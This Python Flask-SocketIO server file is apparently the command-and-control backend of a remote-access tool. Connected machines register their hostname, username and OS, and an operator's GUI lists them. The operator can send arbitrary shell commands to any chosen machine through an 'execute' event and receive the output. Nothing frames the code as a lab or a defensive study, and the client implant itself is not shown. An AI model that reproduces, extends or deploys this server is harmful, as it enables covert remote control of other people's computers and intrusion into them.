# server.py
from flask import Flask, request
from flask_socketio import SocketIO, emit
import os
from threading import Thread
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'change-this-in-render-env')
socketio = SocketIO(
    app, 
    cors_allowed_origins="*", 
    async_mode='threading',
    ping_timeout=60,
    ping_interval=25,
    logger=False,
    engineio_logger=False
)

clients = {}

class Client:
    def __init__(self, sid, ip, hostname, username, os_info):
        self.sid = sid
        self.ip = ip
        self.hostname = hostname
        self.username = username
        self.os_info = os_info
        self.last_seen = time.time()

def cleanup_dead_clients():
    """Remove clients that haven't sent heartbeat in 2 minutes"""
    while True:
        time.sleep(60)
        now = time.time()
        dead_clients = []
        for sid, client in list(clients.items()):
            if now - client.last_seen > 120:
                dead_clients.append(sid)
        
        for sid in dead_clients:
            if sid in clients:
                print(f"[-] Removing dead client: {clients[sid].hostname}")
                del clients[sid]
                socketio.emit('client_left', {'sid': sid}, namespace='/gui', broadcast=True)

@socketio.on('connect', namespace='/client')
def handle_client_connect():
    print(f"[+] Client connect attempt: {request.sid}")

@socketio.on('register', namespace='/client')
def handle_register(data):
    client = Client(
        sid=request.sid,
        ip=request.remote_addr,
        hostname=data.get('hostname', 'Unknown'),
        username=data.get('username', 'Unknown'),
        os_info=data.get('os_info', 'Unknown')
    )
    clients[request.sid] = client
    print(f"[+] Registered: {client.hostname} ({client.ip})")
    
    socketio.emit('new_client', {
        'sid': request.sid,
        'ip': client.ip,
        'hostname': client.hostname,
        'username': client.username,
        'os_info': client.os_info
    }, namespace='/gui', broadcast=True)
    
    emit('registered', {'status': 'ok'})

@socketio.on('heartbeat', namespace='/client')
def handle_heartbeat():
    if request.sid in clients:
        clients[request.sid].last_seen = time.time()

@socketio.on('result', namespace='/client')
def handle_result(data):
    result = data.get('result', '')
    socketio.emit('command_result', {
        'sid': request.sid,
        'result': result
    }, namespace='/gui', broadcast=True)

@socketio.on('disconnect', namespace='/client')
def handle_client_disconnect():
    if request.sid in clients:
        client = clients[request.sid]
        print(f"[-] Disconnected: {client.hostname}")
        del clients[request.sid]
        socketio.emit('client_left', {'sid': request.sid}, namespace='/gui', broadcast=True)

@socketio.on('connect', namespace='/gui')
def handle_gui_connect():
    print(f"[GUI] Controller connected")
    client_list = [{
        'sid': sid,
        'ip': c.ip,
        'hostname': c.hostname,
        'username': c.username,
        'os_info': c.os_info
    } for sid, c in clients.items()]
    emit('client_list', {'clients': client_list})

@socketio.on('get_clients', namespace='/gui')
def handle_get_clients():
    client_list = [{
        'sid': sid,
        'ip': c.ip,
        'hostname': c.hostname,
        'username': c.username,
        'os_info': c.os_info
    } for sid, c in clients.items()]
    emit('client_list', {'clients': client_list})

@socketio.on('send_command', namespace='/gui')
def handle_send_command(data):
    target_sid = data.get('sid')
    command = data.get('command')
    
    if target_sid in clients:
        print(f"[>] Command to {target_sid}: {command}")
        socketio.emit('execute', {'command': command}, room=target_sid, namespace='/client')
    else:
        emit('error', {'message': 'Client not found'})

@app.route('/')
def index():
    return {'status': 'running', 'clients': len(clients)}, 200

@app.route('/health')
def health():
    return {'status': 'ok', 'clients': len(clients)}, 200

@app.route('/ping')
def ping():
    return 'pong', 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    
    # Start cleanup thread
    Thread(target=cleanup_dead_clients, daemon=True).start()
    
    print(f"[*] Starting server on port {port}")
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
